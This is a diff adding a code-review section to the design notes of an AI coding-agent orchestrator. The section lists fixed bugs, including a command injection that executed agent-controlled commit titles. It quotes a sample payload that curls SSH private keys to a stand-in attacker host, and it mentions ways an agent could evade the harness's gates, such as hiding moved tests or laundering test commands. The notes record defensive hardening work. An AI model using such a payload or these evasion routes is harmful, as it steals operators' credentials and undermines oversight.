@@ -138,3 +138,18 @@ a genuine same-mind blind spot the program never probed, and it defines the next
 arc (call it H7: trust-boundary hardening). The container backend (H4.4 seam,
 already typed and gated) moves from "future" to "required for adversarial
 isolation."
+
+## Independent cloud review (`/code-review ultra`, PR #8, 2026-07-06)
+
+Ran after the red-team + Phase 1–4 fixes. Found 8 findings the red-team (gate-evasion focus) and same-mind dev both missed — most notably a REAL command-injection vuln. Triaged + fixed in v0.20.156:
+
+- **bug_007 (injection, fixed):** `execSync` interpolated agent-controlled commit titles / checkpoint reasons / PR title+body via `JSON.stringify`, which does NOT escape `$(...)`/backticks → a story title like `$(curl attacker?d=$(cat ~/.ssh/id_rsa))` executed on the host with operator credentials. Converted all agent-string sinks (git add/commit in git-helpers, git push + gh pr create in orchestrator) to `execFileSync` argv — no shell. Reproduced-then-fixed; regression test `commit-injection.integration.test.ts` (canary proves no execution).
+- **merged_bug_001 (false-positive, fixed):** the Phase 2 disclosure gate read `devFilesModified` captured only at initial dev-story — a legit major-rework that adds a file falsely escalated `undisclosed-files-in-merge`. Now accumulates fix-cycle disclosures. Site 2: retry context recomputes `modifiedTrackedFiles` fresh.
+- **bug_012 (auth-halt gap, fixed):** H0.4 auth-halt was only in create-story/dev-story catches; wired into the code-review catch + phantom-review branch (covers the resume case where every story is past dev-story).
+- **bug_002 (fixed):** commit-blind tripwire `--diff-filter=MD`→`MDR` (a `git mv` of a test out of discovery was invisible).
+- **bug_003 (fixed):** `.h` mapped to C only → C++ header stories failed; `.h`/`.hxx` now valid for cpp.
+- **bug_005 (fixed):** laundering regex broadened to brace-group/`return 0`/`exec true`; docstring de-overclaimed.
+- **merged_bug_011 (fixed):** `vendor`/`target` language-gated (Go `go mod vendor` / Rust are legit); commit-side denylist aligned with the contamination list (+bare `venv`).
+- **bug_014 (deferred):** auth-signature substrings could false-positive on auth-testing stories — recoverable nit, follow-up (tighten to last ~2KB / line-anchor).
+
+Full suite 570/11307; eval 100%; matrix 16/16 (+ injection + auth-halt regression tests).
